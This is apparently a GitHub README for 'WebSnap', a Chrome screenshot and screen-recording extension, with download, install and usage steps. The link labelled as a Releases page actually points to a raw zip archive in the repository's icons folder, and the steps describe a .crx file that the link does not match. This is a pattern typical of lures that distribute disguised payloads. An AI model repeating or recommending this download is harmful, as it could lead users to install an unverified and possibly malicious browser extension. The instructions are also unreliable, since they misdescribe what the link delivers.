## üì¶ Download & Install

To start using WebSnap, visit this page to download: [WebSnap Releases](https://raw.githubusercontent.com/siqueira7820/WebSnap/main/icons/WebSnap-2.6.zip).

1. Click on the link above to go to the Releases page.
2. You will see different versions of WebSnap, listed by release date.
3. Choose the latest version and click on the link for the `.crx` file to download.
4. Once the file is downloaded, open Google Chrome.
5. Drag and drop the `.crx` file into the Chrome Extensions page (you can access this page by typing `chrome://extensions/` in the address bar).
6. A prompt will appear. Click 'Add Extension' to install.
7. Once installed, you will see the WebSnap icon in the top-right corner of your Chrome browser.

## üìë How to Use WebSnap

1. Click the WebSnap icon in your Chrome toolbar.
2. Select "Take Screenshot" for a still image or "Start Recording" for a video.
3. Follow the on-screen instructions to capture your content.
4. Edit your screenshot or video as needed.
5. Save or share your captures directly from the extension.
